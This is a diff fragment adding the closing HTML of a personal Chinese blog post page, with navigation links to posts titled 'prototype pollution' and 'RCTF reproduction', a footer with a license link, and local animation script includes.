+    <a class="post_nav_item" href="/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"
+       data-magnetic data-stroke data-cursor="上一篇">
+      <span class="post_nav_label">上一篇</span>
+      <span class="post_nav_title">原型链污染</span>
+    </a>
+    
+    
+    <a class="post_nav_item post_nav_item--next" href="/RCTF%E5%A4%8D%E7%8E%B0/"
+       data-magnetic data-stroke data-cursor="下一篇">
+      <span class="post_nav_label">下一篇</span>
+      <span class="post_nav_title">RCTF复现</span>
+    </a>
+    
+  </nav>
+
+  <p class="post_back">
+    <a href="/tags/" data-magnetic data-stroke data-cursor="全部文章">
+      <svg class="icon" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4.6 12h14.2"/><path d="m13 6.2 5.8 5.8-5.8 5.8"/></svg><span>按标签浏览全部文章</span>
+    </a>
+  </p>
+</article>
+
+    </main>
+
+    <footer class="site_footer">
+  <p class="site_footer_copy">
+    &copy; 2026 祈染安 &middot; 安的角落
+  </p>
+  <p class="site_footer_license">
+    <a href="/about/" data-cursor="关于">关于</a>
+    &middot;
+    <a href="/feed.xml" data-cursor="订阅">RSS</a>
+    &middot;
+    <a target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/deed.zh" rel="license noopener">CC BY-NC 4.0</a>
+  </p>
+</footer>
+
+
+    <!-- 动画依赖全部本地化，不依赖任何 CDN -->
+    <script src="/js/vendor/gsap.min.js"></script>
+    <script src="/js/vendor/ScrollTrigger.min.js"></script>
+    <script src="/js/vendor/CustomEase.min.js"></script>
+    <script src="/js/vendor/SplitText.min.js"></script>
+    <script src="/js/vendor/lenis.min.js"></script>
+    <script src="/js/frontend.js"></script>
+  </body>
+</html>
